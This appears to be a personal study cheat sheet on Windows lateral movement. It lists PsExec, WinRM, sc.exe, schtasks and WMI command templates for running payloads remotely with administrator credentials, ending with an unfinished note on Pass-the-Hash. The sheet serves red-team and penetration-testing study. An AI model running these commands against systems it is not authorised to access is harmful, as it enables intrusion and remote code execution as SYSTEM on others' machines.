# About UAC & Admins:
- The differences we are interested in are restrictions imposed by User Account Control (UAC) over local administrators (except for the default Administrator account). By default, **local administrators won't be able to remotely connect to a machine** and perform administrative tasks unless using an interactive session through **RDP**. Windows will deny any administrative task requested via RPC, SMB or WinRM since such administrators will be logged in with a filtered medium integrity token, preventing the account from doing privileged actions. The only local account that will get full privileges is the default Administrator account.
- **Domain accounts with local administration privileges** won't be subject to the same treatment and will be logged in with **full administrative privileges**.



### Runas is usefull:
    + runas.exe /netonly /user:<domain>\<username> cmd.exe

# 1-Psexec:
- **Required_1**: Ports: 445/TCP (SMB)
- **Required_2**: Group Memberships: Administrators
- **command**
```ps1
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

# 2-WinRM(create process):
- **Required_1**: Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required_2**: Group Memberships: Remote Management Users
- **command option1**
```ps1
#To connect to a remote Powershell session from the command line, we can use the following command
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```
- **command option2**
```ps1
#We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
#Options1_ Interactive session:
Enter-PSSession -Computername TARGET -Credential $credential
#Options2_ run Script:
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```


# 3-SC.exe
**create services remotely**
- **Required_1**: Ports:
    - 135/TCP, 49152-65535/TCP (DCE/RPC)
    - 445/TCP (RPC over SMB Named Pipes)
    - 139/TCP (RPC over SMB Named Pipes)
- **Required_2**: Group Memberships: Administrators
- **command**
```ps1
# create Service
sc.exe \\TARGET create ServiceName binPath= "<command/payload to execute>" start= auto 
sc.exe \\TARGET start ServiceName
# kill Service
sc.exe \\TARGET stop ServiceName
sc.exe \\TARGET delete ServiceName
``` 

# 4-creating Scheduled Task remotely:
```ps1
schtasks /s TARGET /RU "SYSTEM" /create /tn "TaskName" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
schtasks /s TARGET /run /TN "TaskName" 

# Kill Schedule task:
schtasks /S TARGET /TN "TaskName" /DELETE /F
```

# 5-Fuckin WMI:
- **Required**:
    - **DCOM**: RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP
    - **Wsman**: WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).
- First we need to provide objects for connecting to WMI:
```ps1
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```
## 5.1-Remote Process creation Using WMI:
- Ports:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators
- **command**
```ps1
$Command = "powershell.exe -Command <command to execute>";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
# you can also do this
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c <command to execute>" 
```
## 5.2-Creating Services Remotely Using WMI:
- Ports:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators
- **command**
```ps1
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "ServiceName";
DisplayName = "ServiceName";
PathName = "<command/path to executable>";
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'ServiceName'"
Invoke-CimMethod -InputObject $Service -MethodName StartService

# to Kill the service:
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

## 5.3-Creating Scheduled Tasks Remotely Using WMI:
- Ports:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators
- **command**
```ps1
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c <command>"
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "TaskName"
Start-ScheduledTask -CimSession $Session -TaskName "TaskName"

# to kill The Task:
Unregister-ScheduledTask -CimSession $Session -TaskName "TaskName"
```

## 5.4-Installing MSI packages Using WMI:
- Ports:
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- Required Group Memberships: Administrators
- **command**
```ps1
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
# on legacy systems:
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

# 6-Alternative for plain-text passwords:
- **Note**: 
    - the NTLM challenge sent during authentication can be responded to just by knowing the password hash.
    - This means we can authenticate without requiring the plaintext password to be known. Instead of having to crack NTLM hashes, 
    - if the Windows domain is configured to use NTLM authentication, we can Pass-the-Hash (PtH) and authenticate successfully.
- 
